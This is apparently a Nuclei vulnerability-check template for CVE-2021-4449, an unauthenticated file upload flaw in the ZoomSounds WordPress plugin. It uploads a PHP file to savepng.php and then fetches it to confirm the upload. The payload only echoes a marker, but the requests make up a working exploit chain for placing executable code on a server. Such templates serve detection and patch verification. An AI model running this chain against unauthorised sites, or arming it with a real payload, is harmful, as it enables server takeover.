id: CVE-2021-4449-final

info:
  name: ZoomSounds Plugin - Unauthenticated Arbitrary File Upload
  author: pdteam
  severity: critical
  description: ZoomSounds plugin for WordPress contains a file upload vulnerability in savepng.php
  reference:
    - https://wpscan.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad
  tags: wordpress,zoomsounds,file-upload,unauth,rce

variables:
  rand_filename: "test_{{rand_base(8)}}"
  test_payload: "nuclei_{{rand_base(12)}}"
  boundary: "----WebKitFormBoundary{{rand_base(16)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/dzs-zoomsounds/savepng.php"
      - "{{BaseURL}}/wp-content/plugins/zoomsounds/savepng.php"

    body: |
      --{{boundary}}
      Content-Disposition: form-data; name="file"; filename="{{rand_filename}}.php"
      Content-Type: text/plain

      <?php echo "{{test_payload}}"; ?>
      --{{boundary}}--

    headers:
      Content-Type: "multipart/form-data; boundary={{boundary}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"

    extractors:
      - type: regex
        name: upload_path
        part: body
        group: 1
        internal: true
        regex:
          - '"url":"([^"]+)"'
          - 'uploads/([^"]+\.php)'

  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/dzs-zoomsounds/savepng.php"
      - "{{BaseURL}}/wp-content/plugins/zoomsounds/savepng.php"

    body: |
      --{{boundary}}
      Content-Disposition: form-data; name="file"; filename="{{rand_filename}}.php"

      <?php echo "{{test_payload}}"; ?>
      --{{boundary}}--

    headers:
      Content-Type: "multipart/form-data; boundary={{boundary}}"
      X-Requested-With: "XMLHttpRequest"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "success") || contains(body, "uploaded")'

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/uploads/{{rand_filename}}.php"

    matchers:
      - type: word
        part: body
        words:
          - "{{test_payload}}"